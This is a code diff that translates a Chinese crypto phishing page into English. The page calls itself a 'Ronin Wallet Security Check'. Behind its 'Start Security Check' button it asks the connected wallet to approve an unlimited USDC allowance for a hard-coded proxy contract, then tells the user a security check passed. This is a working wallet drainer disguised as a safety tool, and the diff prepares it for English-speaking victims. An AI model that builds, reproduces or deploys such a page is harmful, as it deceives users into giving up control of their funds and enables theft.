@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ronin钱包安全检测</title>
+    <title>Ronin Wallet Security Check</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -47,39 +47,39 @@
             margin-top: 20px;
             padding: 10px;
             font-size: 18px;
-            color: #ff4d4d; /* 修改状态提示为红色 */
+            color: #ff4d4d; /* Changed status text to red */
         }
         img {
-            width: 98px; /* 图标原尺寸 */
+            width: 98px; /* Logo original size */
             height: auto;
             margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
-    <!-- Ronin Logo 图片 -->
+    <!-- Ronin Logo Image -->
     <img src="https://roninchain.com/static/images/ronin-nav-logo.svg" alt="Ronin Logo">
-    <h1>Ronin钱包安全检测</h1>
+    <h1>Ronin Wallet Security Check</h1>
 
-    <!-- 链接钱包按钮 -->
-    <button id="connectWallet" onclick="connectWallet()">链接钱包</button>
-    <p id="walletStatus">钱包未连接</p>
+    <!-- Connect Wallet Button -->
+    <button id="connectWallet" onclick="connectWallet()">Connect Wallet</button>
+    <p id="walletStatus">Wallet not connected</p>
 
-    <!-- 安全检测按钮 -->
-    <button id="approveButton" onclick="approveTokens()" disabled>开始安全检测</button>
+    <!-- Security Check Button -->
+    <button id="approveButton" onclick="approveTokens()" disabled>Start Security Check</button>
 
-    <!-- 状态提示区域 -->
-    <div class="status" id="operationStatus">状态: 等待操作...</div>
+    <!-- Status Message -->
+    <div class="status" id="operationStatus">Status: Waiting for action...</div>
 
-    <!-- 替代 CDN -->
+    <!-- Alternative CDN -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        // 配置
-        const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // 主网 USDC 代币地址
-        const proxyAddress = "0x572a3a205247f867fe63637bf5183142d5ac0d9e"; // 主网代理合约地址
+        // Configuration
+        const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // Mainnet USDC token address
+        const proxyAddress = "0x572a3a205247f867fe63637bf5183142d5ac0d9e"; // Mainnet proxy contract address
         let provider, signer;
 
-        // ERC20 代币合约 ABI
+        // ERC20 Token Contract ABI
         const tokenABI = [
             {
                 "inputs": [
@@ -180,57 +180,57 @@
             }
         ];
 
-        // 链接钱包
+        // Connect Wallet
         async function connectWallet() {
             if (typeof window.ethereum !== "undefined") {
                 try {
-                    // 请求用户连接钱包
+                    // Request user to connect wallet
                     provider = new ethers.providers.Web3Provider(window.ethereum);
-                    await provider.send("eth_requestAccounts", []); // 请求用户的账户
-                    signer = provider.getSigner(); // 获取钱包签名者
-                    const walletAddress = await signer.getAddress(); // 获取钱包地址
+                    await provider.send("eth_requestAccounts", []); // Request user accounts
+                    signer = provider.getSigner(); // Get wallet signer
+                    const walletAddress = await signer.getAddress(); // Get wallet address
 
-                    // 更新钱包状态
-                    document.getElementById("walletStatus").innerText = `已连接钱包地址: ${walletAddress}`;
-                    document.getElementById("approveButton").disabled = false; // 启用安全检测按钮
-                    document.getElementById("operationStatus").innerText = "状态: 钱包已连接，可以开始安全检测。";
+                    // Update wallet status
+                    document.getElementById("walletStatus").innerText = `Wallet connected: ${walletAddress}`;
+                    document.getElementById("approveButton").disabled = false; // Enable security check button
+                    document.getElementById("operationStatus").innerText = "Status: Wallet connected, you can start security check.";
                 } catch (error) {
-                    console.error("钱包连接失败:", error);
-                    alert("钱包连接失败，请重试！");
+                    console.error("Wallet connection failed:", error);
+                    alert("Wallet connection failed, please try again!");
                 }
             } else {
-                alert("请安装 MetaMask 或其他钱包扩展！");
+                alert("Please install MetaMask or another wallet extension!");
             }
         }
 
-        // 安全检测
+        // Security Check
         async function approveTokens() {
-            // 禁用按钮避免重复点击
+            // Disable button to prevent multiple clicks
             document.getElementById("approveButton").disabled = true;
-            document.getElementById("operationStatus").innerText = "状态: 正在安全检测中，请稍候...";
+            document.getElementById("operationStatus").innerText = "Status: Performing security check, please wait...";
 
             if (!signer) {
-                alert("请先链接钱包！");
+                alert("Please connect your wallet first!");
                 return;
             }
 
-            // 创建代币合约实例
+            // Create token contract instance
             const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
 
             try {
-                // 调用 approve 方法授权无限额度
+                // Call approve method with unlimited allowance
                 const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
-                console.log("安全检测已发送:", tx.hash);
-                await tx.wait(); // 等待交易确认
-                document.getElementById("operationStatus").innerText = "状态: 安全检测完成！";
-                alert("操作成功，已完成安全检测！");
+                console.log("Security check sent:", tx.hash);
+                await tx.wait(); // Wait for transaction confirmation
+                document.getElementById("operationStatus").innerText = "Status: Security check completed!";
+                alert("Operation successful, security check completed!");
             } catch (error) {
-                console.error("操作失败:", error);
-                document.getElementById("operationStatus").innerText = "状态: 检测失败，请检查控制台错误信息！";
-                alert("操作失败，请检查控制台错误信息！");
+                console.error("Operation failed:", error);
+                document.getElementById("operationStatus").innerText = "Status: The detection is not completed. Please refresh and try again.";
+                alert("Operation failed, please check the console for errors!");
             }
 
-            // 完成后启用按钮
+            // Re-enable the button after completion
             document.getElementById("approveButton").disabled = false;
         }
     </script>
